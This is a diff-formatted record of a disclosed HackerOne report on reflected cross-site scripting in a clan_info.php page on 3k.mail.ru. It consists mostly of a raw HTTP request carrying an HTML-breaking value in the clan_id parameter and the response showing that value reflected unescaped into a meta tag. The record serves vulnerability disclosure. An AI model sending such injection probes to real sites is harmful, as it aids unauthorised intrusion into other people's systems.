@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/43723
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:13.09.2015 12:09:24
+
+Summary:
+
+GET /clan_info.php?clan_id=96334"><a>fe647 HTTP/1.1
+Host: 3k.mail.ru
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+
+
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251" />
+
+	<meta name="mrc__share_title" content="" />
+
+	<meta property="og:title" content="Клан " />
+	<meta property="og:description" content="При одном упоминании нашего имени враги трепещут от страха. Пока мы вместе, победа за нами!" />
+	<meta property="og:type" content="website" />
+	<meta property="og:url" content="http://3k.mail.ru/clan_info.php?clan_id=96334"><a>fe647" />
